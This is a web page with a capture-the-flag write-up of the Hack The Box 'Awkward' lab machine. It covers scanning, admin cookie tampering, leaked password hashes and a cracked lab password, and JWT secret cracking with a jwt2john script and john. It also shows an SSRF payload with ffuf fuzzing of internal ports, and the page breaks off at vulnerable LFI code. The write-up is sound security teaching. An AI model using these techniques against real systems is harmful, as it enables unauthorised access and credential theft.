<!DOCTYPE html><html lang="en"> <head><!-- Global Metadata --><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><link rel="icon" type="image/svg+xml" href="/favicon.svg"><link rel="sitemap" href="/sitemap-index.xml"><link rel="alternate" type="application/rss+xml" title="Hackthebox Awkward Writeup" href="https://sabuj0338.github.io/rss.xml"><meta name="generator" content="Astro v5.2.3"><meta name="astro-view-transitions-enabled" content="true"><meta name="astro-view-transitions-fallback" content="animate"><script type="module" src="/astro/ClientRouter.astro_astro_type_script_index_0_lang.rasoniT7.js"></script><!-- Font preloads --><link rel="preload" href="/fonts/atkinson-regular.woff" as="font" type="font/woff" crossorigin><link rel="preload" href="/fonts/atkinson-bold.woff" as="font" type="font/woff" crossorigin><!-- Canonical URL --><link rel="canonical" href="https://sabuj0338.github.io/blog/hackthebox-awkward-writeup/"><!-- Primary Meta Tags --><title>Hackthebox Awkward Writeup</title><meta name="title" content="Hackthebox Awkward Writeup"><meta name="description" content="Hackthebox released a new machine called awkward. On this machine, we got the web server where there is a JS file which gives us a route and manipulating the token gives access to the dashboard and also reveals the api endpoints which give the user info and ssrf through ssrf. We got the bean user. After that, abuse the sed command to get the www-data user, then to root abuse the mail command."><!-- Open Graph / Facebook --><meta property="og:type" content="website"><meta property="og:url" content="https://sabuj0338.github.io/blog/hackthebox-awkward-writeup/"><meta property="og:title" content="Hackthebox Awkward Writeup"><meta property="og:description" content="Hackthebox released a new machine called awkward. On this machine, we got the web server where there is a JS file which gives us a route and manipulating the token gives access to the dashboard and also reveals the api endpoints which give the user info and ssrf through ssrf. We got the bean user. After that, abuse the sed command to get the www-data user, then to root abuse the mail command."><meta property="og:image" content="https://sabuj0338.github.io/blog-placeholder-1.jpg"><!-- Twitter --><meta property="twitter:card" content="summary_large_image"><meta property="twitter:url" content="https://sabuj0338.github.io/blog/hackthebox-awkward-writeup/"><meta property="twitter:title" content="Hackthebox Awkward Writeup"><meta property="twitter:description" content="Hackthebox released a new machine called awkward. On this machine, we got the web server where there is a JS file which gives us a route and manipulating the token gives access to the dashboard and also reveals the api endpoints which give the user info and ssrf through ssrf. We got the bean user. After that, abuse the sed command to get the www-data user, then to root abuse the mail command."><meta property="twitter:image" content="https://sabuj0338.github.io/blog-placeholder-1.jpg"><link rel="stylesheet" href="/astro/slug_.DY9e1hDO.css"><style>[data-astro-transition-scope="astro-e6v72jrr-1"] { view-transition-name: heading; }@layer astro { ::view-transition-old(heading) { 
	animation-duration: 180ms;
	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
	animation-fill-mode: both;
	animation-name: astroFadeOut; }::view-transition-new(heading) { 
	animation-duration: 180ms;
	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
	animation-fill-mode: both;
	animation-name: astroFadeIn; }[data-astro-transition=back]::view-transition-old(heading) { 
	animation-duration: 180ms;
	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
	animation-fill-mode: both;
	animation-name: astroFadeOut; }[data-astro-transition=back]::view-transition-new(heading) { 
	animation-duration: 180ms;
	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
	animation-fill-mode: both;
	animation-name: astroFadeIn; } }[data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-e6v72jrr-1"],
			[data-astro-transition-fallback="old"][data-astro-transition-scope="astro-e6v72jrr-1"] { 
	animation-duration: 180ms;
	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
	animation-fill-mode: both;
	animation-name: astroFadeOut; }[data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-e6v72jrr-1"],
			[data-astro-transition-fallback="new"][data-astro-transition-scope="astro-e6v72jrr-1"] { 
	animation-duration: 180ms;
	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
	animation-fill-mode: both;
	animation-name: astroFadeIn; }[data-astro-transition=back][data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-e6v72jrr-1"],
			[data-astro-transition=back][data-astro-transition-fallback="old"][data-astro-transition-scope="astro-e6v72jrr-1"] { 
	animation-duration: 180ms;
	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
	animation-fill-mode: both;
	animation-name: astroFadeOut; }[data-astro-transition=back][data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-e6v72jrr-1"],
			[data-astro-transition=back][data-astro-transition-fallback="new"][data-astro-transition-scope="astro-e6v72jrr-1"] { 
	animation-duration: 180ms;
	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
	animation-fill-mode: both;
	animation-name: astroFadeIn; }</style></head> <body class="bg-gray-50 dark:bg-gray-950 text-black dark:text-white"> <div class="flex flex-col justify-center items-start max-w-2xl border-gray-200 dark:border-gray-700 mx-auto"> <nav class="flex items-center justify-between w-full relative max-w-2xl border-gray-200 dark:border-gray-700 mx-auto pt-8 pb-8 sm:pb-16 text-gray-900 bg-gray-50 dark:bg-gray-950 bg-opacity-60 dark:text-gray-100"> <div class="ml-[-0.60rem]"> <a href="/" class="font-normal text-gray-600 dark:text-gray-400 hidden md:inline-block p-1 sm:px-3 sm:py-2 rounded-lg hover:bg-gray-200 dark:hover:bg-gray-800 transition-all"> <span class="capsize">Home</span> </a><a href="/blog" class="font-normal text-gray-600 dark:text-gray-400 hidden md:inline-block p-1 sm:px-3 sm:py-2 rounded-lg hover:bg-gray-200 dark:hover:bg-gray-800 transition-all"> <span class="capsize">Blog</span> </a> </div> </nav> <main>  <article class="flex flex-col items-start justify-center w-full max-w-2xl mx-auto mb-16"> <h1 class="mb-4 text-3xl font-bold tracking-tight text-black md:text-5xl dark:text-white" data-astro-transition-scope="astro-e6v72jrr-1"> Hackthebox Awkward Writeup </h1> <div class="flex flex-col items-start justify-between w-full mt-2 md:flex-row md:items-center"> <div class="flex items-center"> <picture> <source srcset="/astro/avatar.B4ze9_9E_Z2KW82.avif" type="image/avif"><source srcset="/astro/avatar.B4ze9_9E_1gC2sR.webp" type="image/webp">  <img src="/astro/avatar.B4ze9_9E_ZrJovo.png" alt="Dedsec" width="1600" height="1600" loading="lazy" decoding="async" class="rounded-full h-6 w-6"> </picture> <p class="ml-2 text-sm text-gray-700 dark:text-gray-300"> JavaScript /  <time datetime="2022-10-29T00:00:00.000Z"> Oct 29, 2022 </time> </p> </div> <p class="mt-2 text-sm text-gray-600 dark:text-gray-400 min-w-32 md:mt-0"> <!-- {readingTime(blog.body).text} -->  •  <!-- <BlogPostViews
          client:only="react"
          slug={blog.slug}
          className="views"
          increment
        /> --> </p> </div> <div class="w-full mt-4 prose dark:prose-light max-w-none break-words"> <h2>Description</h2> <p>Hackthebox released a new machine called awkward. On this machine, we got the web server where there is a JS file which gives us a route and manipulating the token gives access to the dashboard and also reveals the api endpoints which give the user info and ssrf through ssrf. We got the bean user. After that, abuse the sed command to get the www-data user, then to root abuse the mail command.</p>  <h2 id="nmap">Nmap</h2>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8;overflow-x:auto" tabindex="0" data-language="js"><code><span class="line"><span style="color:#E1E4E8">nmap </span><span style="color:#F97583">-</span><span style="color:#E1E4E8">sC </span><span style="color:#F97583">-</span><span style="color:#E1E4E8">sV </span><span style="color:#F97583">-</span><span style="color:#E1E4E8">oA nmap</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">result </span><span style="color:#79B8FF">10.10</span><span style="color:#E1E4E8">.</span><span style="color:#79B8FF">11.185</span></span>
<span class="line"><span style="color:#E1E4E8">Starting Nmap </span><span style="color:#79B8FF">7.93</span><span style="color:#E1E4E8"> ( </span><span style="color:#FFAB70">https</span><span style="color:#F97583">:</span><span style="color:#6A737D">//nmap.org ) at 2022-10-28 22:01 CDT</span></span>
<span class="line"><span style="color:#B392F0">Nmap</span><span style="color:#B392F0"> scan</span><span style="color:#B392F0"> report</span><span style="color:#B392F0"> for</span><span style="color:#B392F0"> hat</span><span style="color:#E1E4E8">-</span><span style="color:#B392F0">valley</span><span style="color:#E1E4E8">.</span><span style="color:#B392F0">htb</span><span style="color:#E1E4E8"> (</span><span style="color:#79B8FF">10.10</span><span style="color:#E1E4E8">.</span><span style="color:#79B8FF">11.185</span><span style="color:#E1E4E8">)</span></span>
<span class="line"><span style="color:#B392F0">Host</span><span style="color:#B392F0"> is</span><span style="color:#B392F0"> up</span><span style="color:#E1E4E8"> (0.086</span><span style="color:#B392F0">s</span><span style="color:#B392F0"> latency</span><span style="color:#E1E4E8">).</span></span>
<span class="line"><span style="color:#B392F0">Not</span><span style="color:#B392F0"> shown</span><span style="color:#F97583">:</span><span style="color:#79B8FF"> 998</span><span style="color:#B392F0"> closed</span><span style="color:#B392F0"> tcp</span><span style="color:#B392F0"> ports</span><span style="color:#E1E4E8"> (</span><span style="color:#B392F0">conn</span><span style="color:#E1E4E8">-</span><span style="color:#B392F0">refused</span><span style="color:#E1E4E8">)</span></span>
<span class="line"><span style="color:#B392F0">PORT</span><span style="color:#B392F0">   STATE</span><span style="color:#B392F0"> SERVICE</span><span style="color:#B392F0"> VERSION</span></span>
<span class="line"><span style="color:#79B8FF">22</span><span style="color:#E1E4E8">/</span><span style="color:#B392F0">tcp</span><span style="color:#B392F0"> open</span><span style="color:#B392F0">  ssh</span><span style="color:#B392F0">     OpenSSH</span><span style="color:#E1E4E8"> 8.9</span><span style="color:#B392F0">p1</span><span style="color:#B392F0"> Ubuntu</span><span style="color:#79B8FF"> 3</span><span style="color:#E1E4E8"> (</span><span style="color:#B392F0">Ubuntu</span><span style="color:#B392F0"> Linux</span><span style="color:#E1E4E8">; </span><span style="color:#B392F0">protocol</span><span style="color:#79B8FF"> 2.0</span><span style="color:#E1E4E8">)</span></span>
<span class="line"><span style="color:#F97583">|</span><span style="color:#B392F0"> ssh</span><span style="color:#E1E4E8">-</span><span style="color:#B392F0">hostkey</span><span style="color:#F97583">:</span></span>
<span class="line"><span style="color:#F97583">|</span><span style="color:#79B8FF">   256</span><span style="color:#E1E4E8"> 7254</span><span style="color:#B392F0">afbaf6e2835941b7cd611c2f418b</span><span style="color:#E1E4E8"> (</span><span style="color:#B392F0">ECDSA</span><span style="color:#E1E4E8">)</span></span>
<span class="line"><span style="color:#F97583">|</span><span style="color:#B392F0">_</span><span style="color:#79B8FF">  256</span><span style="color:#E1E4E8"> 59365</span><span style="color:#B392F0">bba3c7821e326b37d23605aec38</span><span style="color:#E1E4E8"> (</span><span style="color:#B392F0">ED25519</span><span style="color:#E1E4E8">)</span></span>
<span class="line"><span style="color:#79B8FF">80</span><span style="color:#E1E4E8">/</span><span style="color:#B392F0">tcp</span><span style="color:#B392F0"> open</span><span style="color:#B392F0">  http</span><span style="color:#B392F0">    nginx</span><span style="color:#79B8FF"> 1.18</span><span style="color:#E1E4E8">.</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8"> (</span><span style="color:#B392F0">Ubuntu</span><span style="color:#E1E4E8">)</span></span>
<span class="line"><span style="color:#F97583">|</span><span style="color:#B392F0">_http</span><span style="color:#E1E4E8">-</span><span style="color:#B392F0">title</span><span style="color:#F97583">:</span><span style="color:#B392F0"> Hat</span><span style="color:#B392F0"> Valley</span></span>
<span class="line"><span style="color:#F97583">|</span><span style="color:#B392F0">_http</span><span style="color:#E1E4E8">-</span><span style="color:#B392F0">server</span><span style="color:#E1E4E8">-</span><span style="color:#B392F0">header</span><span style="color:#F97583">:</span><span style="color:#B392F0"> nginx</span><span style="color:#E1E4E8">/</span><span style="color:#79B8FF">1.18</span><span style="color:#E1E4E8">.</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8"> (</span><span style="color:#B392F0">Ubuntu</span><span style="color:#E1E4E8">)</span></span>
<span class="line"><span style="color:#B392F0">Service</span><span style="color:#B392F0"> Info</span><span style="color:#F97583">:</span><span style="color:#B392F0"> OS</span><span style="color:#F97583">:</span><span style="color:#B392F0"> Linux</span><span style="color:#E1E4E8">; </span><span style="color:#B392F0">CPE</span><span style="color:#F97583">:</span><span style="color:#B392F0"> cpe</span><span style="color:#F97583">:</span><span style="color:#E1E4E8">/</span><span style="color:#B392F0">o</span><span style="color:#F97583">:</span><span style="color:#B392F0">linux</span><span style="color:#F97583">:</span><span style="color:#B392F0">linux_kernel</span></span>
<span class="line"></span>
<span class="line"><span style="color:#B392F0">Service</span><span style="color:#B392F0"> detection</span><span style="color:#B392F0"> performed</span><span style="color:#E1E4E8">. </span><span style="color:#B392F0">Please</span><span style="color:#B392F0"> report</span><span style="color:#79B8FF"> any</span><span style="color:#B392F0"> incorrect</span><span style="color:#B392F0"> results</span><span style="color:#B392F0"> at</span><span style="color:#B392F0"> https</span><span style="color:#F97583">:</span><span style="color:#6A737D">//nmap.org/submit/ .</span></span>
<span class="line"><span style="color:#B392F0">Nmap</span><span style="color:#B392F0"> done</span><span style="color:#F97583">:</span><span style="color:#79B8FF"> 1</span><span style="color:#B392F0"> IP</span><span style="color:#B392F0"> address</span><span style="color:#E1E4E8"> (</span><span style="color:#79B8FF">1</span><span style="color:#B392F0"> host</span><span style="color:#B392F0"> up</span><span style="color:#E1E4E8">) </span><span style="color:#B392F0">scanned</span><span style="color:#B392F0"> in</span><span style="color:#79B8FF"> 12.72</span><span style="color:#B392F0"> seconds</span></span></code></pre>
<p>Nmap tell us there are two open ports <code>22 ssh</code> and <code>80 http</code> and HTTP port redirect to <a href="http://hat-valley.htb/">http://hat-valley.htb/</a></p>
<p>Let’s quickly add this in our <code>/etc/hosts</code> file.</p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8;overflow-x:auto" tabindex="0" data-language="js"><code><span class="line"><span style="color:#E1E4E8">cat </span><span style="color:#F97583">/</span><span style="color:#E1E4E8">etc</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">hosts</span></span>
<span class="line"><span style="color:#79B8FF">127.0</span><span style="color:#E1E4E8">.</span><span style="color:#79B8FF">0.1</span><span style="color:#E1E4E8">       localhost</span></span>
<span class="line"><span style="color:#79B8FF">127.0</span><span style="color:#E1E4E8">.</span><span style="color:#79B8FF">1.1</span><span style="color:#E1E4E8">       dedinfosec</span></span>
<span class="line"></span>
<span class="line"><span style="color:#79B8FF">10.10</span><span style="color:#E1E4E8">.</span><span style="color:#79B8FF">11.185</span><span style="color:#E1E4E8">    hat</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">valley.htb</span></span>
<span class="line"><span style="color:#E1E4E8"># The following lines are desirable for IPv6 capable hosts</span></span>
<span class="line"><span style="color:#E1E4E8">::</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">     localhost ip6</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">localhost ip6</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">loopback</span></span>
<span class="line"><span style="color:#B392F0">ff02</span><span style="color:#E1E4E8">::</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8"> ip6</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">allnodes</span></span>
<span class="line"><span style="color:#B392F0">ff02</span><span style="color:#E1E4E8">::</span><span style="color:#79B8FF">2</span><span style="color:#E1E4E8"> ip6</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">allrouters</span></span></code></pre>
<h2 id="port-80">Port-80</h2>
<p>Simple <code>web page</code> nothing interesting there</p>
<img loading="lazy" class="border dark:border-[#2e2e2e] border-[#ebebeb] rounded-lg" src="https://wsrv.nl/?url=https://0xdedinfosec-cdn.pages.dev/hackthebox/hackthebox-awkward-writeup/web.png&output=webp" alt="hackthebox-awkward-writeup" width="1920" height="1080" decoding="async">
<p>Checking the source code of the web page got the <code>app.js</code> file</p>
<img loading="lazy" class="border dark:border-[#2e2e2e] border-[#ebebeb] rounded-lg" src="https://wsrv.nl/?url=https://0xdedinfosec-cdn.pages.dev/hackthebox/hackthebox-awkward-writeup/web1.png&output=webp" alt="hackthebox-awkward-writeup" width="1920" height="1080" decoding="async">
<p>The code inside <code>app.js</code> file is too messy, so I use online beautifier</p>
<p>Link : <a href="https://beautifier.io/">https://beautifier.io/</a></p>
<p>In the code found a <code>useful</code> link which goes to <code>/hr</code> page</p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8;overflow-x:auto" tabindex="0" data-language="js"><code><span class="line"><span style="color:#E1E4E8">{\n </span><span style="color:#B392F0">href</span><span style="color:#E1E4E8">: \</span><span style="color:#9ECBFF">&quot;/hr</span><span style="color:#79B8FF">\&quot;</span><span style="color:#9ECBFF">,</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">    onClick: _cache[0] || (_cache[0] = function () {</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">      return $options.logout &amp;&amp; $options.logout.apply($options, arguments);</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">    })</span><span style="color:#79B8FF">\n</span><span style="color:#FDAEB7;font-style:italic">  }</span></span></code></pre>
<p>On the <code>/hr</code> page, it’s required <code>creads</code> to login</p>
<img loading="lazy" class="border dark:border-[#2e2e2e] border-[#ebebeb] rounded-lg" src="https://wsrv.nl/?url=https://0xdedinfosec-cdn.pages.dev/hackthebox/hackthebox-awkward-writeup/web2.png&output=webp" alt="hackthebox-awkward-writeup" width="1920" height="1080" decoding="async">
<p>But if we see the <code>cookies</code> of the website, there is a token which is set to <code>guest</code></p>
<img loading="lazy" class="border dark:border-[#2e2e2e] border-[#ebebeb] rounded-lg" src="https://wsrv.nl/?url=https://0xdedinfosec-cdn.pages.dev/hackthebox/hackthebox-awkward-writeup/web3.png&output=webp" alt="hackthebox-awkward-writeup" width="1920" height="1080" decoding="async">
<p>Let’s change that to <code>admin</code></p>
<img loading="lazy" class="border dark:border-[#2e2e2e] border-[#ebebeb] rounded-lg" src="https://wsrv.nl/?url=https://0xdedinfosec-cdn.pages.dev/hackthebox/hackthebox-awkward-writeup/web4.png&output=webp" alt="hackthebox-awkward-writeup" width="1920" height="1080" decoding="async">
<p>After refreshing the page, we are inside the <code>dashboard</code></p>
<img loading="lazy" class="border dark:border-[#2e2e2e] border-[#ebebeb] rounded-lg" src="https://wsrv.nl/?url=https://0xdedinfosec-cdn.pages.dev/hackthebox/hackthebox-awkward-writeup/web5.png&output=webp" alt="hackthebox-awkward-writeup" width="1920" height="1080" decoding="async">
<p>But if you see there is a <code>section</code> for staff details which is empty and the status of the <code>store is down</code></p>
<p>Let’s check the <code>network</code> tab to find where they fetch this <code>details</code></p>
<p>And we found two <code>useful</code> links</p>
<ul>
<li>/api/staff-details</li>
<li>/api/store-status</li>
</ul>
<img loading="lazy" class="border dark:border-[#2e2e2e] border-[#ebebeb] rounded-lg" src="https://wsrv.nl/?url=https://0xdedinfosec-cdn.pages.dev/hackthebox/hackthebox-awkward-writeup/web6.png&output=webp" alt="hackthebox-awkward-writeup" width="1920" height="1080" decoding="async">
<p>Going over to <code>/api/staff-details</code> we got the error called <code>jwt malformed</code></p>
<img loading="lazy" class="border dark:border-[#2e2e2e] border-[#ebebeb] rounded-lg" src="https://wsrv.nl/?url=https://0xdedinfosec-cdn.pages.dev/hackthebox/hackthebox-awkward-writeup/web7.png&output=webp" alt="hackthebox-awkward-writeup" width="1920" height="1080" decoding="async">
<p>Let’s delete the <code>cookie</code> and then see what <code>error</code> we got</p>
<img loading="lazy" class="border dark:border-[#2e2e2e] border-[#ebebeb] rounded-lg" src="https://wsrv.nl/?url=https://0xdedinfosec-cdn.pages.dev/hackthebox/hackthebox-awkward-writeup/web8.png&output=webp" alt="hackthebox-awkward-writeup" width="1920" height="1080" decoding="async">
<h2 id="information-disclosure">Information Disclosure</h2>
<p>After <code>removing</code> the cookie, we got the all <code>user</code> details as well as <code>password</code> for each user</p>
<img loading="lazy" class="border dark:border-[#2e2e2e] border-[#ebebeb] rounded-lg" src="https://wsrv.nl/?url=https://0xdedinfosec-cdn.pages.dev/hackthebox/hackthebox-awkward-writeup/web9.png&output=webp" alt="hackthebox-awkward-writeup" width="1920" height="1080" decoding="async">
<p>I use <code>crack station</code> to crack that hashes because it’s look like it is <code>sha256</code> hash</p>
<p>and one of the hash is <code>cracked</code></p>
<img loading="lazy" class="border dark:border-[#2e2e2e] border-[#ebebeb] rounded-lg" src="https://wsrv.nl/?url=https://0xdedinfosec-cdn.pages.dev/hackthebox/hackthebox-awkward-writeup/web10.png&output=webp" alt="hackthebox-awkward-writeup" width="1920" height="1080" decoding="async">
<ul>
<li>Creads for Christopher - username: christopher.jones - password: chris123
I log in with these creads in <code>/hr</code> page</li>
</ul>
<img loading="lazy" class="border dark:border-[#2e2e2e] border-[#ebebeb] rounded-lg" src="https://wsrv.nl/?url=https://0xdedinfosec-cdn.pages.dev/hackthebox/hackthebox-awkward-writeup/web11.png&output=webp" alt="hackthebox-awkward-writeup" width="1920" height="1080" decoding="async">
<p>And got the <code>JWT</code> token, let’s try to crack the JWT <code>secret</code></p>
<img loading="lazy" class="border dark:border-[#2e2e2e] border-[#ebebeb] rounded-lg" src="https://wsrv.nl/?url=https://0xdedinfosec-cdn.pages.dev/hackthebox/hackthebox-awkward-writeup/web12.png&output=webp" alt="hackthebox-awkward-writeup" width="1920" height="1080" decoding="async">
<h2 id="cracking-jwt-secret">Cracking JWT Secret</h2>
<p>I am using the official <code>jwt2john</code> python script</p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8;overflow-x:auto" tabindex="0" data-language="js"><code><span class="line"><span style="color:#6A737D">#!/usr/bin/env python3</span></span>
<span class="line"><span style="color:#F97583">import</span><span style="color:#E1E4E8"> sys</span></span>
<span class="line"><span style="color:#F97583">from</span><span style="color:#E1E4E8"> jwt.utils import base64url_decode</span></span>
<span class="line"><span style="color:#F97583">from</span><span style="color:#E1E4E8"> binascii import hexlify</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="color:#E1E4E8">def jwt2john(jwt):</span></span>
<span class="line"><span style="color:#9ECBFF">    &quot;&quot;&quot;</span></span>
<span class="line"><span style="color:#9ECBFF">    Convert signature from base64 to hex, and separate it from the data by a </span><span style="color:#FDAEB7;font-style:italic">#</span></span>
<span class="line"><span style="color:#E1E4E8">    so that John can parse it.</span></span>
<span class="line"><span style="color:#9ECBFF">    &quot;&quot;&quot;</span></span>
<span class="line"><span style="color:#9ECBFF">    jwt_bytes = jwt.encode(&#39;ascii&#39;</span><span style="color:#FDAEB7;font-style:italic">)</span></span>
<span class="line"><span style="color:#E1E4E8">    parts = jwt_bytes.split(b</span><span style="color:#9ECBFF">&#39;.&#39;</span><span style="color:#E1E4E8">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#E1E4E8">    data = parts[0] + b</span><span style="color:#9ECBFF">&#39;.&#39;</span><span style="color:#E1E4E8"> + parts[1]</span></span>
<span class="line"><span style="color:#E1E4E8">    signature = hexlify(base64url_decode(parts[2]))</span></span>
<span class="line"></span>
<span class="line"><span style="color:#E1E4E8">    return (data + b</span><span style="color:#9ECBFF">&#39;#&#39;</span><span style="color:#E1E4E8"> + signature).decode(</span><span style="color:#9ECBFF">&#39;ascii&#39;</span><span style="color:#E1E4E8">)</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="color:#E1E4E8">if __name__ == </span><span style="color:#9ECBFF">&quot;__main__&quot;</span><span style="color:#E1E4E8">:</span></span>
<span class="line"><span style="color:#E1E4E8">    if len(sys.argv) != 2:</span></span>
<span class="line"><span style="color:#E1E4E8">        print(</span><span style="color:#9ECBFF">&quot;Usage: %s JWT&quot;</span><span style="color:#E1E4E8"> % sys.argv[0])</span></span>
<span class="line"><span style="color:#E1E4E8">    else:</span></span>
<span class="line"><span style="color:#E1E4E8">        john = jwt2john(sys.argv[1])</span></span>
<span class="line"><span style="color:#E1E4E8">        print(john)</span></span></code></pre>
<p>Convert the token into <code>john</code> format</p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8;overflow-x:auto" tabindex="0" data-language="js"><code><span class="line"><span style="color:#F97583">&gt;</span><span style="color:#E1E4E8"> python3 jwt2john.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjY3MDE3MTU3fQ.M5Yx5hMqtxf3hxrIJSjdLSdubkP6gFPtGzwsDDr7voI </span><span style="color:#F97583">&gt;</span><span style="color:#E1E4E8"> jwt_hash</span></span>
<span class="line"><span style="color:#F97583">&gt;</span><span style="color:#E1E4E8"> john </span><span style="color:#F97583">-</span><span style="color:#E1E4E8">w</span><span style="color:#F97583">=/</span><span style="color:#E1E4E8">usr</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">share</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">wordlists</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">rockyou.txt jwt_hash</span></span></code></pre>
<p>And got the <code>secret</code> of the JWT</p>
<img loading="lazy" class="border dark:border-[#2e2e2e] border-[#ebebeb] rounded-lg" src="https://wsrv.nl/?url=https://0xdedinfosec-cdn.pages.dev/hackthebox/hackthebox-awkward-writeup/cmd.png&output=webp" alt="hackthebox-awkward-writeup" width="1920" height="1080" decoding="async">
<ul>
<li>Secret of JWT - 123beany123
I create the <code>JWT</code> token with the username which we found, but there is nothing on the <code>/dashboard</code> page</li>
</ul>
<p>So let’s move further with another <code>api</code> endpoint which we found <code>/api/store-status</code></p>
<img loading="lazy" class="border dark:border-[#2e2e2e] border-[#ebebeb] rounded-lg" src="https://wsrv.nl/?url=https://0xdedinfosec-cdn.pages.dev/hackthebox/hackthebox-awkward-writeup/web13.png&output=webp" alt="hackthebox-awkward-writeup" width="1920" height="1080" decoding="async">
<h2 id="server-side-request-forgery-ssrf">Server-side request forgery (SSRF)</h2>
<p>The <code>API endpoint</code> is required a URL to check his status of that we can try <code>SSRF</code> on that</p>
<p>First, I try <code>localhost</code> URL with <code>80</code> port, and it is redirecting to <a href="http://hat-valley.htb/">http://hat-valley.htb/</a></p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8;overflow-x:auto" tabindex="0" data-language="js"><code><span class="line"><span style="color:#B392F0">http</span><span style="color:#E1E4E8">:</span><span style="color:#6A737D">//hat-valley.htb/api/store-status?url=&quot;http://127.0.0.1:80&quot; -&gt; http://hat-valley.htb/</span></span></code></pre>
<p>So it’s conform that it is <code>vulnerable</code> to SSRF Now let’s try to <code>enumerate</code> the ports which is running on the <code>internal network</code></p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8;overflow-x:auto" tabindex="0" data-language="js"><code><span class="line"><span style="color:#E1E4E8">ffuf </span><span style="color:#F97583">-</span><span style="color:#E1E4E8">w </span><span style="color:#F97583">/</span><span style="color:#E1E4E8">opt</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">SecLists</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">Fuzzing</span><span style="color:#F97583">/</span><span style="color:#79B8FF">4</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">digits</span><span style="color:#F97583">-</span><span style="color:#79B8FF">0000</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">9999.txt </span><span style="color:#F97583">-</span><span style="color:#E1E4E8">u </span><span style="color:#9ECBFF">&#39;http://hat-valley.htb/api/store-status?url=&quot;http://127.0.0.1:FUZZ&quot;&#39;</span><span style="color:#F97583"> -</span><span style="color:#E1E4E8">fs </span><span style="color:#79B8FF">0</span></span></code></pre>
<p>And we got <code>3 ports</code> running internally, let’s check them <code>one by one</code></p>
<img loading="lazy" class="border dark:border-[#2e2e2e] border-[#ebebeb] rounded-lg" src="https://wsrv.nl/?url=https://0xdedinfosec-cdn.pages.dev/hackthebox/hackthebox-awkward-writeup/cmd1.png&output=webp" alt="hackthebox-awkward-writeup" width="1920" height="1080" decoding="async">
<p>8080 port require <code>JavaScript</code> to run</p>
<img loading="lazy" class="border dark:border-[#2e2e2e] border-[#ebebeb] rounded-lg" src="https://wsrv.nl/?url=https://0xdedinfosec-cdn.pages.dev/hackthebox/hackthebox-awkward-writeup/web14.png&output=webp" alt="hackthebox-awkward-writeup" width="1920" height="1080" decoding="async">
<p>3002 port give us the all <code>API</code> endpoints routes as well as their <code>source code</code></p>
<img loading="lazy" class="border dark:border-[#2e2e2e] border-[#ebebeb] rounded-lg" src="https://wsrv.nl/?url=https://0xdedinfosec-cdn.pages.dev/hackthebox/hackthebox-awkward-writeup/web15.png&output=webp" alt="hackthebox-awkward-writeup" width="1920" height="1080" decoding="async">
<h2 id="local-file-inclusion-lfi">Local File Inclusion (LFI)</h2>
<p>Found an <code>endpoint</code> which is vulnerable to LFI</p>
<p>The <code>AWK</code> command is <code>vulnerable</code>, now the box name make sense</p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8;overflow-x:auto" tabindex="0" data-language="js"><code><span class="line"><span style="color:#E1E4E8">app.</span><span style="color:#B392F0">get</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">&#39;/api/all-leave&#39;</span><span style="color:#E1E4E8">, (</span><span style="color:#FFAB70">req</span><span style="color:#E1E4E8">, </span><span style="color:#FFAB70">res</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">=&gt;</span><span style="color:#E1E4E8"> {</span></span>
<span class="line"><span style="color:#F97583">    const</span><span style="color:#79B8FF"> user_token</span><span style="color:#F97583"> =</span><span style="color:#E1E4E8"> req.cookies.token;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#F97583">    var</span><span style="color:#E1E4E8"> authFailed </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> false</span><span style="color:#E1E4E8">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#F97583">    var</span><span style="color:#E1E4E8"> user </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> null</span><span style="color:#E1E4E8">;</span></span>
<span class="line"></span>
